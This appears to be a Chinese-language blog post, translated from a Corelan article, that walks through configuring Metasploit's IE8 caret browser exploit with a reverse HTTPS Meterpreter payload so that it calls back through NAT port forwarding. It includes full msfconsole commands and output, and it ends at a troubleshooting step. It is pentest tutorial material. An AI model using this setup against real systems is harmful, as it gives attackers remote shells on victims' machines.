@@ -1,0 +1,812 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="tusk1'Blog" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="翻译：Metasploit Meterpreter and NAT引言在对某服务器进行实战渗透的过程中，我发现metasploit不能正常发起攻击，经过查阅后发现是因为Metasploit网络服务器无法监听我们路由器的公网IP，而这篇文章(原文链接:https://www.corelan.be/index.php/2014/01/04/metasploit-meterpreter-and-nat/">
+<meta property="og:type" content="article">
+<meta property="og:title" content="翻译:Metasploit Meterpreter and NAT">
+<meta property="og:url" content="http://yoursite.com/2019/01/22/翻译-Metasploit-Meterpreter-and-NAT/index.html">
+<meta property="og:site_name" content="tusk1&#39;Blog">
+<meta property="og:description" content="翻译：Metasploit Meterpreter and NAT引言在对某服务器进行实战渗透的过程中，我发现metasploit不能正常发起攻击，经过查阅后发现是因为Metasploit网络服务器无法监听我们路由器的公网IP，而这篇文章(原文链接:https://www.corelan.be/index.php/2014/01/04/metasploit-meterpreter-and-nat/">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://yoursite.com/2019/01/22/翻译-Metasploit-Meterpreter-and-NAT/1.png">
+<meta property="og:image" content="http://yoursite.com/2019/01/22/翻译-Metasploit-Meterpreter-and-NAT/2.png">
+<meta property="og:image" content="http://yoursite.com/2019/01/22/翻译-Metasploit-Meterpreter-and-NAT/3.png">
+<meta property="og:updated_time" content="2019-01-22T06:00:25.469Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="翻译:Metasploit Meterpreter and NAT">
+<meta name="twitter:description" content="翻译：Metasploit Meterpreter and NAT引言在对某服务器进行实战渗透的过程中，我发现metasploit不能正常发起攻击，经过查阅后发现是因为Metasploit网络服务器无法监听我们路由器的公网IP，而这篇文章(原文链接:https://www.corelan.be/index.php/2014/01/04/metasploit-meterpreter-and-nat/">
+<meta name="twitter:image" content="http://yoursite.com/2019/01/22/翻译-Metasploit-Meterpreter-and-NAT/1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/01/22/翻译-Metasploit-Meterpreter-and-NAT/">
+
+
+
+
+
+  <title>翻译:Metasploit Meterpreter and NAT | tusk1'Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">tusk1'Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/01/22/翻译-Metasploit-Meterpreter-and-NAT/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="tusk1">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="tusk1'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">翻译:Metasploit Meterpreter and NAT</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-01-22T13:39:58+08:00">
+                2019-01-22
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="翻译：Metasploit-Meterpreter-and-NAT"><a href="#翻译：Metasploit-Meterpreter-and-NAT" class="headerlink" title="翻译：Metasploit Meterpreter and NAT"></a>翻译：Metasploit Meterpreter and NAT</h1><h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>在对某服务器进行实战渗透的过程中，我发现metasploit不能正常发起攻击，经过查阅后发现是因为Metasploit网络服务器无法监听我们路由器的公网IP，而这篇文章(原文链接:<a href="https://www.corelan.be/index.php/2014/01/04/metasploit-meterpreter-and-nat/" target="_blank" rel="noopener">https://www.corelan.be/index.php/2014/01/04/metasploit-meterpreter-and-nat/</a> )帮助我解决了这个问题，遂翻译，以下是正文。  </p>
+<hr>
+<p>专业测试人员通常使用直接连接到互联网的主机，具有公网IP地址，并且不受任何防火墙或NAT设备的阻碍以执行其监听。黑客攻击“naked”(暴露公网IP的主机)被认为是进行渗透测试的最简单方法，该测试涉及反弹shell。</p>
+<p>不是所有人都可以将主机直接连接到互联网，随着免费公网IP地址的数量不断减少，在路由器或防火墙后面使用放置在局域网中的攻击机的需求将会增加。</p>
+<p>将攻击机放在路由设备后面会将流量从私有转换为公共并且会产生一些问题。如果启动相当快速的端口扫描，您不仅需要确保NAT设备不会“中断”，而且由于主机位于专用网络中，即路由器或防火墙后面，因此无法直接从互联网</p>
+<p>在这种情况下，执行攻击和处理返回信息的shell可能会有问题。</p>
+<p>在这篇小文章中，我们将了解如何正确配置Meterpreter有效负载，并使攻击机位于NAT设备后面时正常工作。我们将使用浏览器漏洞来演示如何获得有效的Meterpreter会话，甚至靶机和攻击机都在NAT后面。</p>
+<h2 id="网络配置"><a href="#网络配置" class="headerlink" title="网络配置"></a>网络配置</h2><p>我将在这篇文章中使用以下网络设置：<br><img src="/2019/01/22/翻译-Metasploit-Meterpreter-and-NAT/1.png" alt=""></p>
+<p>攻击者和目标都在NAT设备后面。我们不知道目标使用的IP范围，我们已经确定从互联网到目标网络没有直接的路径，目标没有绑定的公网IP。<br>我们假设目标能够通过端口80和443连接到互联网。<br>在此文中，我使用IP 1.1.1.1来指攻击网络的“公共”方面。在尝试本文中的步骤时，您需要您自己的公网IP替换此IP。<br>我将使用Kali Linux作为攻击端，并在主机上设置了Metasploit Git存储库的克隆：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd /</span><br><span class="line">mkdir -p /pentest/exploits</span><br><span class="line">git clone https://github.com/rapid7/metasploit.git</span><br><span class="line">cd metasploit-framework</span><br><span class="line">bundle install</span><br></pre></td></tr></table></figure></p>
+<p>如果你已经设置了git clone，请确保使用“git pull”更新到最新版本.<br>靶机的系统为Windows XP SP3，但这并不重要，我们将使用浏览器漏洞来演示如何使用Meterpreter。我从IECollection安装了Internet Explorer 8（下载地址：<a href="http://utilu.com/IECollection/)" target="_blank" rel="noopener">http://utilu.com/IECollection/)</a>. 我将使用这个IE版本，因为它已经过时，并且存在大多数IE8浏览器漏洞。  </p>
+<h2 id="在攻击端设置转发"><a href="#在攻击端设置转发" class="headerlink" title="在攻击端设置转发"></a>在攻击端设置转发</h2><p>如果我们希望能够接受来自目标的连接，我们需要配置攻击端防火墙/ NAT以在某些端口上转发流量。<br>执行此操作的确切步骤将非常特定于你正在使用的路由器/防火墙的品牌/型号/类型，所以这超出了这篇文章的范围。<br>一般来说，我们的想法是配置路由器/防火墙，在端口80和443上与路由器的公网IP地址进行通信，<br>并被转发到192.168.0.187（我的攻击机的内网IP）。<br>配置路由器/防火墙时，请务必检查路由器/防火墙是否开放端口80和443。  </p>
+<p>我们将使用端口80为浏览器exp提供服务，通过端口443反向连接Meterpreter。首先，我们需要验证转发是否有效。  </p>
+<p>在Kali上，创建一个小的html文件并将其存储在/ tmp下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root @ krypto1：/ #cd / tmp </span><br><span class="line">root @ krypto1：/ tmp #echo“it works”&gt; test.html</span><br></pre></td></tr></table></figure></p>
+<p>接下来，确保当前没有任何进程占用端口80或端口443<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@krypto1:/tmp# netstat -vantu | grep :80</span><br><span class="line">root@krypto1:/tmp# netstat -vantu | grep :443</span><br></pre></td></tr></table></figure></p>
+<p>如果你没有看到两个命令的输出，可以进行下一步。如果列出了什么，你需要找到使用该端口的进程并终止进程。<br>对于端口80，你可以查看占用http端口的进程，使用lsof命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@krypto1:/tmp# lsof -i | grep :http </span><br><span class="line">apache2    4634     root    4u  IPv6 393366      0t0  TCP *:http (LISTEN)</span><br><span class="line">apache2    4642 www-data    4u  IPv6 393366      0t0  TCP *:http (LISTEN)</span><br><span class="line">apache2    4643 www-data    4u  IPv6 393366      0t0  TCP *:http (LISTEN)</span><br><span class="line">apache2    4644 www-data    4u  IPv6 393366      0t0  TCP *:http (LISTEN)</span><br><span class="line">apache2    4645 www-data    4u  IPv6 393366      0t0  TCP *:http (LISTEN)</span><br><span class="line">apache2    4646 www-data    4u  IPv6 393366      0t0  TCP *:http (LISTEN)</span><br></pre></td></tr></table></figure></p>
+<p>只需停止apache2即可释放端口：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@krypto1:/tmp# service apache2 stop</span><br><span class="line">Stopping web server: apache2 ... waiting .</span><br><span class="line">root@krypto1:/tmp#</span><br></pre></td></tr></table></figure></p>
+<p>当端口可使用后，我们运行一个简单的web服务器并提供”test.html”页面。在包含test.html文件的文件夹中，运行以下python命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@krypto1:/tmp# python -m SimpleHTTPServer 80</span><br><span class="line">Serving HTTP on 0.0.0.0 port 80 ...</span><br></pre></td></tr></table></figure></p>
+<p>如果你现在在Kali中访问<a href="http://192.168.0.187/test.html，您将看到“It" target="_blank" rel="noopener">http://192.168.0.187/test.html，您将看到“It</a> works”页面和<br><img src="/2019/01/22/翻译-Metasploit-Meterpreter-and-NAT/2.png" alt=""><br>Kali浏览器的输出应列出连接并显示该页面已响应。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@krypto1:/tmp# python -m SimpleHTTPServer 80</span><br><span class="line">Serving HTTP on 0.0.0.0 port 80 ...</span><br><span class="line">192.168.0.187 - - [04/Jan/2014 12:42:02] &quot;GET /test.html HTTP/1.1&quot; 200 -</span><br></pre></td></tr></table></figure></p>
+<p>完美，这验证了网络服务器的工作原理。在靶机上，访问<a href="http://1.1.1.1/test.html" target="_blank" rel="noopener">http://1.1.1.1/test.html</a> (再一次，将1.1.1.1替换为攻击端路由器/防火墙的公网IP)并且你将得到同样的页面. 如果你没有看到该页面，请检查转发是否设置正确。<br>如果80端口成功，请返回攻击机并使用CTRL+C.终止python命令。然后再次启动命令，这次使用443端口：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@krypto1:/tmp# python -m SimpleHTTPServer 443</span><br><span class="line">Serving HTTP on 0.0.0.0 port 443 ...</span><br></pre></td></tr></table></figure></p>
+<p>现在通过443端口访问Web服务器。尽管我们使用443端口并且443端口通常与https(加密)相关联，但我们的python处理程序不使用加密。也就是说，我们仍然必须在URL中使用http而不是https：<br><img src="/2019/01/22/翻译-Metasploit-Meterpreter-and-NAT/3.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@krypto1:/tmp# python -m SimpleHTTPServer 443</span><br><span class="line">Serving HTTP on 0.0.0.0 port 443 ...</span><br><span class="line">192.168.0.187 - - [04/Jan/2014 12:47:44] &quot;GET /test.html HTTP/1.1&quot; 200 -</span><br><span class="line">192.168.0.187 - - [04/Jan/2014 12:47:44] code 404, message File not found</span><br><span class="line">192.168.0.187 - - [04/Jan/2014 12:47:44] &quot;GET /favicon.ico HTTP/1.1&quot; 404 -</span><br><span class="line">192.168.0.187 - - [04/Jan/2014 12:47:44] code 404, message File not found</span><br><span class="line">192.168.0.187 - - [04/Jan/2014 12:47:44] &quot;GET /favicon.ico HTTP/1.1&quot; 404 -</span><br></pre></td></tr></table></figure></p>
+<p>（不要担心与/favicon.ico相关的404消息 - 忽略它们是ok的）<br>如果您可以从靶机连接到<a href="http://1.1.1.1:443/test.html" target="_blank" rel="noopener">http://1.1.1.1:443/test.html</a> ，我们知道端口转发对端口80和443都正常工作。如果这不起作用，那就没有意义再继续，因为我们尝试的任何其他事情都将失败。</p>
+<p>当一切正常时，关闭python命令以释放端口443。</p>
+<h2 id="Metasploit配置"><a href="#Metasploit配置" class="headerlink" title="Metasploit配置"></a>Metasploit配置</h2><h4 id="浏览器漏洞利用-meterpreter-reverse-https"><a href="#浏览器漏洞利用-meterpreter-reverse-https" class="headerlink" title="浏览器漏洞利用 - meterpreter / reverse_https"></a>浏览器漏洞利用 - meterpreter / reverse_https</h4><p>首先，我们设置Metasploit以服务于浏览器漏洞并处理反向https Meterpreter连接。方法是欺骗目标连接80端口上的exp并通过端口443提供meterpreter/reverse_https连接。</p>
+<p>转到metasploit-framework文件夹，打开msfconsole（如果你想确保从正确的文件夹运行msfconsole而不是Kali自带的版本，请不要忘记./）并选择一个漏洞。为了这个演示，我将使用ms13_069_caret.rb：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">root@krypto1:/tmp# cd /pentest/exploits/metasploit-framework/</span><br><span class="line">(master) root@krypto1:/pentest/exploits/metasploit-framework# ./msfconsole </span><br><span class="line">     ,           ,</span><br><span class="line">    /             \</span><br><span class="line">   ((__---,,,---__))</span><br><span class="line">      (_) O O (_)_________</span><br><span class="line">         \ _ /            |\</span><br><span class="line">          o_o \   M S F   | \</span><br><span class="line">               \   _____  |  *</span><br><span class="line">                |||   WW|||</span><br><span class="line">                |||     |||</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       =[ metasploit v4.9.0-dev [core:4.9 api:1.0]</span><br><span class="line">+ -- --=[ 1248 exploits - 678 auxiliary - 199 post</span><br><span class="line">+ -- --=[ 324 payloads - 32 encoders - 8 nops</span><br><span class="line"></span><br><span class="line">msf &gt; use exploit/windows/browser/ms13_069_caret </span><br><span class="line">msf exploit(ms13_069_caret) &gt;</span><br></pre></td></tr></table></figure></p>
+<p>Show the options:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(ms13_069_caret) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/browser/ms13_069_caret):</span><br><span class="line"></span><br><span class="line">   Name        Current Setting  Required  Description</span><br><span class="line">   ----        ---------------  --------  -----------</span><br><span class="line">   SRVHOST     0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0</span><br><span class="line">   SRVPORT     8080             yes       The local port to listen on.</span><br><span class="line">   SSL         false            no        Negotiate SSL for incoming connections</span><br><span class="line">   SSLCert                      no        Path to a custom SSL certificate (default is randomly generated)</span><br><span class="line">   SSLVersion  SSL3             no        Specify the version of SSL that should be used (accepted: SSL2, SSL3, TLS1)</span><br><span class="line">   URIPATH                      no        The URI to use for this exploit (default is random)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   IE 8 on Windows XP SP3</span><br></pre></td></tr></table></figure></p>
+<p>该漏洞需要一个SRVHOST和SRVPORT.这两个变量将由Metasploit用于确定网络服务器需要绑定和监听的位置。方法是使用我们的公网IP欺骗靶机连接到此网络服务器，然后流量转发到我们的Metasploit实例。</p>
+<p>我们无法让Metasploit网络服务器监听我们路由器的公网IP，因为它无法将自己“绑定”到该IP地址。如果我们使用0.0.0.0，Metasploit网络服务器将只是监听传入流量的所有接口。换句话说，您可以将SRVHOST保留为0.0.0.0，或者您可以将其设置为Kali本身的l内网IP（本例中为192.168.0.187）。我将保留默认值为0.0.0.0.</p>
+<p>接下来，我们需要将端口更改为80，并且我们将URIPATH设置为/ （因此我们可以知道URI将是什么，而不是让Metasploit创建随机URI）：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(ms13_069_caret) &gt; set SRVPORT 80</span><br><span class="line">SRVPORT =&gt; 80</span><br><span class="line">msf exploit(ms13_069_caret) &gt; set URIPATH /</span><br><span class="line">URIPATH =&gt; /</span><br></pre></td></tr></table></figure></p>
+<p>接下来，我们选择meterpreter reverse_https作为payload。如果我们再次运行“show options”，我们会看到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(ms13_069_caret) &gt; set payload windows/meterpreter/reverse_https</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_https</span><br><span class="line">msf exploit(ms13_069_caret) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/browser/ms13_069_caret):</span><br><span class="line"></span><br><span class="line">   Name        Current Setting  Required  Description</span><br><span class="line">   ----        ---------------  --------  -----------</span><br><span class="line">   SRVHOST     0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0</span><br><span class="line">   SRVPORT     80               yes       The local port to listen on.</span><br><span class="line">   SSL         false            no        Negotiate SSL for incoming connections</span><br><span class="line">   SSLCert                      no        Path to a custom SSL certificate (default is randomly generated)</span><br><span class="line">   SSLVersion  SSL3             no        Specify the version of SSL that should be used (accepted: SSL2, SSL3, TLS1)</span><br><span class="line">   URIPATH     /                no        The URI to use for this exploit (default is random)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_https):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  process          yes       Exit technique: seh, thread, process, none</span><br><span class="line">   LHOST                      yes       The local listener hostname</span><br><span class="line">   LPORT     443              yes       The local listener port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   IE 8 on Windows XP SP3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf exploit(ms13_069_caret) &gt;</span><br></pre></td></tr></table></figure></p>
+<p>模块选项(SRVHOST和SRVPORT)按我们希望的方式设置. payload选项需要LHOST和LPORT。根据上面的输出，LPORT已设置为443.这是反向Meterpreter将尝试连接的端口。如果你的kali上没有设置为443，只需运行“set LPORT 443”使Meterpreter处理程序侦听端口443：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(ms13_069_caret) &gt; set LPORT 443</span><br><span class="line">LPORT =&gt; 443</span><br></pre></td></tr></table></figure></p>
+<p>注意：在任何情况下，为了使事情尽可能简单，请尝试为特定的“服务”使用相同的端口. 也就是说，如果您在防火墙的80端口上托管Web服务器，请尝试确保也转发80端口的流量到攻击机/Metasploit上，并在Metasploit的80端口上加载漏洞exp。同样适用于有效载荷。如果我们在端口443上提供有效载荷，请确保在每个地方都使用此端口。<br>LHOST有两个目的:  </p>
+<ul>
+<li>它指示Meterpreter shellcode必须反向连接的IP地址（从靶机到攻击机）。</li>
+<li>它告诉Metasploit在设置Meterpreter“处理程序”时绑定到哪里。  </li>
+</ul>
+<p>由于我们的攻击者主机位于NAT之后，我们必须使用路由器/防火墙的公网IP地址作为LHOST. 执行漏洞利用时，此IP将嵌入到shellcode中，当初始Meterpreter shellcode在靶机上运行时，它将反向连接这个IP地址。我们的路由器/防火墙上的端口转发然后将流量转发到攻击者主机的内网IP。为此，我们需要将LHOST设置为1.1.1.1(你的攻击机的公网IP)。  </p>
+<p>使用公网IP作为LHOST也意味着Metasploit将在设置Meterpreter处理程序时尝试将自身绑定到该IP。由于此IP属于路由器/防火墙而不属于Metasploit实例，因此显然会失败。幸运的是，Metasploit将自动回退到0.0.0.0，并基本上为攻击机上的所有本地IP提供Meterpreter处理程序服务，同时记住LHOST已设置为我们的公网IP地址。这正是我们所需要的。  </p>
+<p>将LHOST设置为1.1.1.1:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf exploit（ms13_069_caret）&gt;设置LHOST 1.1.1.1</span><br><span class="line">LHOST =&gt; 1.1.1.1</span><br></pre></td></tr></table></figure></p>
+<p>如果我们真的不希望Meterpreter处理程序回退到0.0.0.0，我们可以使用其中一个“高级”选项并告诉它监听内网IP地址：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(ms13_069_caret) &gt; set ReverseListenerBindAddress 192.168.0.187</span><br><span class="line">ReverseListenerBindAddress =&gt; 192.168.0.187</span><br></pre></td></tr></table></figure></p>
+<p>然后启动漏洞exp：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(ms13_069_caret) &gt; exploit</span><br><span class="line">[*] Exploit running as background job.</span><br><span class="line"></span><br><span class="line">[*] Started HTTPS reverse handler on https://192.168.0.187:443/</span><br><span class="line">[*] Using URL: http://0.0.0.0:80/</span><br><span class="line">[*]  Local IP: http://192.168.0.187:80/</span><br><span class="line">[*] Server started.</span><br></pre></td></tr></table></figure></p>
+<p>输出告诉我们  </p>
+<ul>
+<li><a href="http://0.0.0.0:80" target="_blank" rel="noopener">http://0.0.0.0:80</a> ,(或<a href="http://192.168.0.187:80" target="_blank" rel="noopener">http://192.168.0.187:80</a> )正在托管浏览器exp。如果目标连接到<a href="http://1.1.1.1" target="_blank" rel="noopener">http://1.1.1.1</a>, 流量将通过80端口转发Kali并为exp利用。</li>
+<li>HTTPS反向处理程序正在侦听192.168.0.187，端口443。  </li>
+</ul>
+<p>我们在输出中没有看到的是，实际的Meterpreter shellcode包含要重新连接的IP地址1.1.1.1。该值取自LHOST变量。  </p>
+<p>如果您没有使用ReverseListenerBindAddress并且在运行“exploit”后得到类似下面的输出，那么请检查以下内容：  </p>
+<ul>
+<li>检查端口是否可以免费使用</li>
+<li>确保您运行的是最新版本的Metasploit</li>
+<li>将ReverseListenerBindAddress设置为本地LAN IP或0.0.0.0</li>
+<li>退出msfconsole并再次打开它。在某些情况下，如果您之前运行过会话，您会发现绑定没有得到及时清理。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(ms13_069_caret) &gt; exploit</span><br><span class="line">[*] Exploit running as background job.</span><br><span class="line"></span><br><span class="line">[-] Exploit failed: Rex::AddressInUse The address is already in use (0.0.0.0:443).</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
